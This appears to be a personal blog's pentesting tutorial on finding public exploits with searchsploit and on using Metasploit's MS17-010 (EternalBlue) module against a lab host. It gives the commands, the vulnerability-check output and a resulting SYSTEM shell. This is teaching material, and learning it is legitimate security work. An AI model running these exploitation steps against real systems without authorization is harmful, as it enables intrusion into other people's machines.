<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Ranjan">
<meta name="description" content="Public Exploits   Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.  Finding Public Exploits  Google for the application name with exploit to see if we get any results Ex- &amp;ldquo;windows 7 smb exploit&amp;rdquo; A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://ranjankhyadad.github.io/blog/exploitation/" />


    <title>
        
            Exploitation :: Ranjan Khyadad 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://ranjankhyadad.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://ranjankhyadad.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://ranjankhyadad.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://ranjankhyadad.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://ranjankhyadad.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://ranjankhyadad.github.io/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://ranjankhyadad.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Exploitation">
<meta itemprop="description" content="Public Exploits   Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.  Finding Public Exploits  Google for the application name with exploit to see if we get any results Ex- &ldquo;windows 7 smb exploit&rdquo; A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application."><meta itemprop="datePublished" content="2022-06-05T15:50:16+05:30" />
<meta itemprop="dateModified" content="2022-06-05T15:50:16+05:30" />
<meta itemprop="wordCount" content="583"><meta itemprop="image" content="https://ranjankhyadad.github.io/"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://ranjankhyadad.github.io/"/>

<meta name="twitter:title" content="Exploitation"/>
<meta name="twitter:description" content="Public Exploits   Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.  Finding Public Exploits  Google for the application name with exploit to see if we get any results Ex- &ldquo;windows 7 smb exploit&rdquo; A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application."/>








    <meta property="article:published_time" content="2022-06-05 15:50:16 &#43;0530 IST" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://ranjankhyadad.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Ranjan</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://ranjankhyadad.github.io/about/">About</a></li><li><a href="https://ranjankhyadad.github.io/blog/">Blog</a></li><li><a href="https://ranjankhyadad.github.io/contact/">Contact</a></li><li><a href="https://ranjankhyadad.github.io/projects/">Projects</a></li><li><a href="https://ranjankhyadad.github.io/resume.pdf">Resume</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://ranjankhyadad.github.io/blog/exploitation/">Exploitation</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="public-exploits">Public Exploits</h2>
<hr>
<ul>
<li>Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits.</li>
<li>Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.</li>
</ul>
<h4 id="finding-public-exploits">Finding Public Exploits</h4>
<ul>
<li>Google for the application name with exploit to see if we get any results
Ex- &ldquo;windows 7 smb exploit&rdquo;</li>
<li>A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:</li>
</ul>
<blockquote>
<p><code>sudo apt install exploitdb -y</code></p>
</blockquote>
<ul>
<li>Then, we can use searchsploit to search for a specific application by its name, as follows:</li>
</ul>
<blockquote>
<p><code>searchsploit openssh 7.2</code></p>
</blockquote>
<ul>
<li>We can also utilize online exploit databases to search for vulnerabilities, like <em>Exploit DB, Rapid7 DB, or Vulnerability Lab.</em></li>
</ul>
<h2 id="metasploit-primer">Metasploit Primer</h2>
<p>-The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.</p>
<ul>
<li>
<p>MSF has many other features, like:</p>
<ul>
<li>Running reconnaissance scripts to enumerate remote hosts and compromised targets</li>
<li>Verification scripts to test the existence of a vulnerability without actually compromising the target</li>
<li>Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets</li>
<li>Many post-exploitation and pivoting tools</li>
</ul>
</li>
<li>
<p>Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run Metasploit, we can use the msfconsole command:</p>
</li>
</ul>
<blockquote>
<p><code>msfconsole</code></p>
</blockquote>
<ul>
<li>Once we have Metasploit running, we can search for our target application with the <code>search exploit</code> command. For example, we can search for the SMB vulnerability we identified previously:</li>
</ul>
<blockquote>
<p><code>search exploit eternalblue</code></p>
<p>Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search</p>
</blockquote>
<ul>
<li>We found one exploit for this service. We can use it by copying the full name of it and using <code>USE</code> to use it:</li>
</ul>
<blockquote>
<p><code>use exploit/windows/smb/ms17_010_psexec</code></p>
</blockquote>
<ul>
<li>Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the <code>show options</code> command.</li>
<li>Any option with <em>Required</em> set to yes needs to be set for the exploit to work. In this case, we only have to options to set: RHOSTS, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the <code>set</code> command:</li>
</ul>
<blockquote>
<p><code>msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40</code></p>
<p><code>msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LHOST tun0</code></p>
</blockquote>
<ul>
<li>Once we have both options set, we can start the exploitation. However, before we run the script, we can run a <code>check</code> to ensure the server is vulnerable:</li>
</ul>
<blockquote>
<p><code>check</code></p>
</blockquote>
<pre><code>[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
</code></pre>
<ul>
<li>As we can see, the server is vulnerable. Note that not every exploit in the Metasploit Framework supports the check function. Finally, we can use the run or exploit command to run the exploit:</li>
</ul>
<blockquote>
<p><code>exploit</code></p>
<p>Result:</p>
<p><code>C:\WINDOWS\system32&gt;whoami</code></p>
<p><code>NT AUTHORITY\SYSTEM</code></p>
</blockquote>
<ul>
<li>As we can see, we have been able to gain admin access to the box and used the shell command to drop us into an interactive shell.</li>
<li>These are basic examples of using Metasploit to exploit a vulnerability on a remote server.</li>
</ul>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/ranjankhyadad">Ranjan</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://ranjankhyadad.github.io/bundle.min.2d3d449fc0ff117f00ac91342a8f76cd5b710411d7a0254dbe75da3234d2f685d6a0c44cff60c414e90b6a149da8e4032c713c25e4e6838e2e3918dc0ad2e81c.js" integrity="sha512-LT1En8D/EX8ArJE0Ko92zVtxBBHXoCVNvnXaMjTS9oXWoMRM/2DEFOkLahSdqOQDLHE8JeTmg44uORjcCtLoHA=="></script>



    </body>
</html>
